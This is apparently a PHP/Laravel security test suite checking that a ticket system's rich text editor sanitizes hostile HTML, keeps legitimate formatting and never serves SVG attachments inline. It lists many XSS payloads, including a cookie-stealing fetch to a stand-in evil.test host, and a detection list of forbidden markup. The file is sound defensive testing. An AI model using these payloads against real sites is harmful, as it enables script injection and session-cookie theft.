<?php

declare(strict_types=1);

namespace Tests\Security;

use App\Livewire\Tickets\Show as TicketShow;
use App\Services\AttachmentStorage;
use App\Support\Markdown;
use App\Support\RichText\EditorHtml;
use App\Support\RichText\RichText;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Livewire\Livewire;
use Tests\TestCase;

/**
 * What the rich text editor must refuse.
 *
 * A WYSIWYG editor changes the threat model of a description in one specific
 * way: the browser now posts HTML. "It came from our editor" describes the
 * happy path and nothing else — a Livewire property is a value in a request,
 * and anybody can send one.
 *
 * Three independent filters stand between that and a rendered page, and the
 * tests below aim at each:
 *
 *   1  the editor's schema. ProseMirror can only produce nodes it declares, so
 *      pasted markup is dropped before it is ever a document. Not testable
 *      here — it runs in a browser — and deliberately not relied upon.
 *   2  App\Support\RichText\EditorHtml, the server-side allow-list. Every
 *      element not named is unwrapped, every attribute not named is deleted,
 *      every URL scheme not named is dropped.
 *   3  the storage format itself. Descriptions are Markdown, rendered by
 *      App\Support\Markdown with `html_input => 'strip'`, so HTML cannot be
 *      expressed in a stored description at all.
 *
 * Filter 3 is the reason this feature did not change the storage format. It is
 * a stronger guarantee than any sanitizer: there is no allow-list to get wrong,
 * because the format has no way to say "script".
 */
class RichTextSanitizationTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Payloads that must not survive, in the shape a browser would post them.
     */
    public static function payloadProvider(): array
    {
        return [
            'script element' => ['<script>alert(1)</script>'],
            'inline handler' => ['<p onclick="alert(1)">click me</p>'],
            'image error handler' => ['<img src=x onerror=alert(1)>'],
            'javascript href' => ['<a href="javascript:alert(1)">go</a>'],
            'mixed case scheme' => ['<a href="JaVaScRiPt:alert(1)">go</a>'],
            'tab inside scheme' => ["<a href=\"java\tscript:alert(1)\">go</a>"],
            'entity encoded scheme' => ['<a href="&#106;avascript:alert(1)">go</a>'],
            'null byte in scheme' => ["<a href=\"java\0script:alert(1)\">go</a>"],
            'vbscript href' => ['<a href="vbscript:msgbox(1)">go</a>'],
            'data url image' => ['<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">'],
            'iframe' => ['<iframe src="https://evil.test"></iframe>'],
            'object' => ['<object data="javascript:alert(1)"></object>'],
            'embed' => ['<embed src="https://evil.test/x.swf">'],
            'svg wrapper' => ['<svg><script>alert(1)</script></svg>'],
            'mathml parser confusion' => ['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
            'form with formaction' => ['<form action="/x"><button formaction="javascript:alert(1)">go</button></form>'],
            'style element' => ['<style>body{background:url(javascript:alert(1))}</style>'],
            'style attribute' => ['<p style="background:url(javascript:alert(1))">x</p>'],
            'template' => ['<template><script>alert(1)</script></template>'],
            'noscript' => ['<noscript><img src=x onerror=alert(1)></noscript>'],
            'base tag' => ['<base href="https://evil.test/">'],
            'html comment hiding markup' => ['<!-- <script>alert(1)</script> -->'],
            'srcset' => ['<img src="/ok.png" srcset="javascript:alert(1)">'],
            'xlink' => ['<a xlink:href="javascript:alert(1)">go</a>'],
        ];
    }

    /**
     * @dataProvider payloadProvider
     */
    public function test_a_hostile_document_survives_neither_storage_nor_rendering(string $payload): void
    {
        $stored = app(RichText::class)->toMarkdown($payload);
        $rendered = app(Markdown::class)->toHtml($stored);

        $forbidden = [
            '<script', 'onerror', 'onclick', 'onload',
            'javascript:', 'vbscript:', 'data:text/html',
            '<iframe', '<object', '<embed', '<style', '<base', '<form',
            'formaction', 'srcset', 'xlink:href',
        ];

        foreach ($forbidden as $needle) {
            /*
             * Checked in the stored Markdown as well as in the rendered HTML,
             * not only in the output. `html_input => 'strip'` would make even a
             * stored <script> inert on the page — but it would still be read
             * verbatim by Ticket::scopeSearch, by board card excerpts and by
             * App\Services\AI\BoardContextBuilder, which sends descriptions to
             * a language model. Nothing hostile should be in the column.
             */
            $this->assertStringNotContainsStringIgnoringCase(
                $needle,
                $stored,
                "'{$needle}' was stored in a ticket description."
            );

            $this->assertStringNotContainsStringIgnoringCase(
                $needle,
                $rendered,
                "'{$needle}' reached the rendered page."
            );
        }
    }

    /**
     * The allow-list has to be narrow without being useless: a sanitizer that
     * also destroys legitimate formatting gets switched off.
     */
    public function test_legitimate_formatting_is_kept(): void
    {
        $stored = app(RichText::class)->toMarkdown(
            '<h2>Heading</h2>'
            .'<p><strong>bold</strong> <em>italic</em> <u>underline</u> <s>struck</s> <code>code</code></p>'
            .'<ul><li>bullet</li></ul>'
            .'<ol><li>numbered</li></ol>'
            .'<blockquote><p>quoted</p></blockquote>'
            .'<pre><code class="language-php">echo 1;</code></pre>'
            .'<p><a href="https://example.test" title="t">link</a></p>'
            .'<p><img src="/attachments/9" alt="shot"></p>'
            .'<table><tbody><tr><th>a</th></tr><tr><td>1</td></tr></tbody></table>'
            .'<ul data-type="taskList"><li data-checked="true"><p>done</p></li></ul>'
        );

        foreach ([
            '## Heading',
            '**bold**',
            '*italic*',
            '++underline++',
            '~~struck~~',
            '`code`',
            '- bullet',
            '1. numbered',
            '> quoted',
            '```php',
            '[link](https://example.test',
            '![shot](/attachments/9)',
            '| a |',
            '- [x] done',
        ] as $expected) {
            $this->assertStringContainsString($expected, $stored, "'{$expected}' was lost by the sanitizer.");
        }
    }

    /**
     * A relative URL has no scheme to abuse, and it is the case that matters:
     * an inline attachment is referenced through the application's own
     * authorized download route.
     */
    public function test_the_authorized_attachment_route_is_a_usable_image_source(): void
    {
        $stored = app(RichText::class)->toMarkdown('<img src="/attachments/42" alt="screenshot">');

        $this->assertSame('![screenshot](/attachments/42)', $stored);

        $this->assertStringContainsString(
            'src="/attachments/42"',
            app(Markdown::class)->toHtml($stored)
        );
    }

    /**
     * Unknown elements are unwrapped rather than deleted, so text a person
     * wrote inside a wrapper the editor did not produce is still their text.
     */
    public function test_unknown_wrappers_are_unwrapped_and_their_text_survives(): void
    {
        $clean = app(EditorHtml::class)->sanitize(
            '<div><section><span style="color:red">kept <b>bold</b> text</span></section></div>'
        );

        $this->assertStringNotContainsString('<div', $clean);
        $this->assertStringNotContainsString('<span', $clean);
        $this->assertStringNotContainsString('style', $clean);
        $this->assertStringContainsString('kept', $clean);
        $this->assertStringContainsString('<b>bold</b>', $clean);
    }

    /**
     * The one exception to "delete every attribute": a fenced block's language
     * travels as class="language-php" and is needed by both the editor and the
     * server-side highlighter.
     */
    public function test_only_the_language_class_survives_on_code(): void
    {
        $clean = app(EditorHtml::class)->sanitize(
            '<pre><code class="language-php" onmouseover="alert(1)" data-x="y">echo 1;</code></pre>'
        );

        $this->assertStringContainsString('language-php', $clean);
        $this->assertStringNotContainsString('onmouseover', $clean);
        $this->assertStringNotContainsString('data-x', $clean);
    }

    // -----------------------------------------------------------------
    // Through the real write path
    // -----------------------------------------------------------------

    /**
     * The end-to-end version: posted as a Livewire property, saved, and
     * fetched back as a page.
     */
    public function test_a_hostile_document_posted_to_the_editor_never_reaches_a_page(): void
    {
        $team = $this->teamMember();
        $board = $this->boardWithColumns([$team]);
        $ticket = $this->ticketOn($board, $team);

        Livewire::actingAs($team)
            ->test(TicketShow::class, ['board' => $board, 'number' => $ticket->number])
            ->call('startEditing')
            ->set('descriptionHtml', '<p onclick="alert(1)">Report</p><script>alert(2)</script>'
                .'<a href="javascript:alert(3)">link</a><img src=x onerror=alert(4)>')
            ->call('save')
            ->assertHasNoErrors();

        $ticket->refresh();

        $stored = (string) $ticket->description_md;

        // The words survive; every executable part is gone, including the bare
        // <a> left behind once its javascript: href was refused.
        $this->assertStringContainsString('Report', $stored);
        $this->assertStringContainsString('link', $stored);
        $this->assertStringNotContainsString('<a', $stored);
        $this->assertStringNotContainsString('script', $stored);
        $this->assertStringNotContainsString('onerror', $stored);

        $html = $this->actingAs($team)
            ->get(route('tickets.show', ['board' => $board, 'number' => $ticket->number]))
            ->assertOk()
            ->getContent();

        /*
         * Asserted against the payload's own markup rather than against the
         * word "onerror" anywhere on the page: Laravel's Vite asset-prefetch
         * script contains `link.onerror` of its own, so a bare substring check
         * would fail for a reason that has nothing to do with this feature.
         * The claim is about executable markup reaching the page.
         */
        $this->assertStringNotContainsString('<script>alert(2)</script>', $html);
        $this->assertStringNotContainsString('onerror=alert', $html);
        $this->assertStringNotContainsString('onclick="alert', $html);
        $this->assertStringNotContainsString('href="javascript:', $html);
        $this->assertStringNotContainsString("href='javascript:", $html);
    }

    /**
     * A customer may edit a request they raised, so the editor is reachable by
     * a customer — the least trusted role in the product.
     */
    public function test_a_customer_cannot_inject_through_the_editor_either(): void
    {
        $customer = $this->customer();
        $board = $this->boardWithColumns([$customer]);
        $ticket = $this->ticketOn($board, $customer, ['customer_visible' => true]);

        Livewire::actingAs($customer)
            ->test(TicketShow::class, ['board' => $board, 'number' => $ticket->number])
            ->call('startEditing')
            ->set('descriptionHtml', '<img src=x onerror="fetch(\'https://evil.test?c=\'+document.cookie)">')
            ->call('save')
            ->assertHasNoErrors();

        $stored = (string) $ticket->refresh()->description_md;

        $this->assertStringNotContainsString('onerror', $stored);
        $this->assertStringNotContainsString('evil.test', $stored);
    }

    /**
     * An SVG is a document, not a bitmap: it can carry `<script>` and event
     * handlers. `svg` is in the allowed upload list, so serving one inline from
     * this origin would run its script with the session's cookies — which is
     * why inline serving excludes it even though it is an image type.
     */
    public function test_an_svg_attachment_is_never_served_inline(): void
    {
        $root = storage_path('framework/testing/svg-'.uniqid());

        config([
            'filesystems.disks.svg-testing' => ['driver' => 'local', 'root' => $root, 'throw' => true],
            'attachments.disk' => 'svg-testing',
        ]);

        $team = $this->teamMember();
        $board = $this->boardWithColumns([$team]);
        $ticket = $this->ticketOn($board, $team);

        $hostile = UploadedFile::fake()->createWithContent(
            'logo.svg',
            '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        );

        $attachment = app(AttachmentStorage::class)->store($hostile, $ticket, $board, $team);

        try {
            $this->assertTrue($attachment->hasImageMimeType(), 'The fixture is not stored as an image type.');

            // An image type, and still a download: the browser never parses it
            // as a document on this origin.
            $this->actingAs($team)
                ->get(route('attachments.show', $attachment))
                ->assertOk()
                ->assertDownload('logo.svg');
        } finally {
            (new Filesystem)->deleteDirectory($root);
        }
    }
}
